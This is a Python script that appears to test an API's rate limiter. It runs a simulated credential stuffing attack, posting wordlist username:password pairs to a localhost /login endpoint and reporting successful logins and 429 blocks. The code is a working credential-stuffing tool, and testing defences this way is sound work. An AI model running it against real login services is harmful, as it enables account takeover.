#!/usr/bin/env python3
"""
Credential Stuffing Simulation Script

This script simulates a credential stuffing attack against the /login endpoint.
It reads username:password pairs from wordlist.txt and fires them sequentially.

Usage:
    python3 attack/attack.py

Expected behavior BEFORE rate limiting:  all 500 requests return 200 or 401
Expected behavior AFTER rate limiting:   requests start returning 429 after limit is hit
"""

import requests
import time
import sys
import os

TARGET_URL = "http://localhost:5000/login"
WORDLIST   = os.path.join(os.path.dirname(__file__), "wordlist.txt")
DELAY      = 0.05   # 50ms between requests — ~20 requests per second


def run_attack():
    print("=" * 60)
    print(" CREDENTIAL STUFFING SIMULATION")
    print(f" Target:   {TARGET_URL}")
    print(f" Wordlist: {WORDLIST}")
    print(f" Delay:    {DELAY}s between requests (~{int(1/DELAY)} req/sec)")
    print("=" * 60)
    print()

    # Read wordlist
    try:
        with open(WORDLIST, 'r') as f:
            credentials = [line.strip() for line in f if ':' in line]
    except FileNotFoundError:
        print(f"[ERROR] Wordlist not found: {WORDLIST}")
        sys.exit(1)

    print(f"[*] Loaded {len(credentials)} credential pairs")
    print(f"[*] Starting attack... press Ctrl+C to stop\n")

    results = {
        "success":       0,
        "failed":        0,
        "rate_limited":  0,
        "errors":        0,
        "total":         0,
    }

    first_429_at = None

    for i, line in enumerate(credentials, 1):
        try:
            username, password = line.split(':', 1)
        except ValueError:
            continue

        try:
            response = requests.post(
                TARGET_URL,
                json={"username": username, "password": password},
                timeout=5
            )

            results["total"] += 1
            status = response.status_code

            if status == 200:
                results["success"] += 1
                print(f"[{i:04d}] SUCCESS   {username}:{password}  → 200 ✓")

            elif status == 401:
                results["failed"] += 1
                if i <= 10 or i % 50 == 0:
                    print(f"[{i:04d}] FAILED    {username}:{password}  → 401")

            elif status == 429:
                results["rate_limited"] += 1
                if first_429_at is None:
                    first_429_at = i
                    print(f"\n[{i:04d}] *** RATE LIMITED ***  → 429 Too Many Requests")
                    print(f"       First block at request #{i}")
                    print(f"       Response: {response.json()}\n")
                else:
                    if results["rate_limited"] % 10 == 0:
                        print(f"[{i:04d}] BLOCKED   → 429 (total blocked: {results['rate_limited']})")

            else:
                results["errors"] += 1
                print(f"[{i:04d}] UNKNOWN   {username}:{password}  → {status}")

        except requests.exceptions.ConnectionError:
            print(f"[{i:04d}] CONNECTION ERROR — is the API running?")
            results["errors"] += 1

        except requests.exceptions.Timeout:
            print(f"[{i:04d}] TIMEOUT")
            results["errors"] += 1

        time.sleep(DELAY)

    # Final summary
    print()
    print("=" * 60)
    print(" ATTACK SUMMARY")
    print("=" * 60)
    print(f" Total requests sent:   {results['total']}")
    print(f" Successful logins:     {results['success']}")
    print(f" Failed (wrong creds):  {results['failed']}")
    print(f" Rate limited (429):    {results['rate_limited']}")
    print(f" Errors:                {results['errors']}")
    if first_429_at:
        print(f" First block at:        request #{first_429_at}")
        protection_pct = (results['rate_limited'] / results['total']) * 100
        print(f" Requests blocked:      {protection_pct:.1f}%")
    else:
        print(f" Rate limiting:         NOT ACTIVE — all requests processed")
    print("=" * 60)


if __name__ == '__main__':
    run_attack()
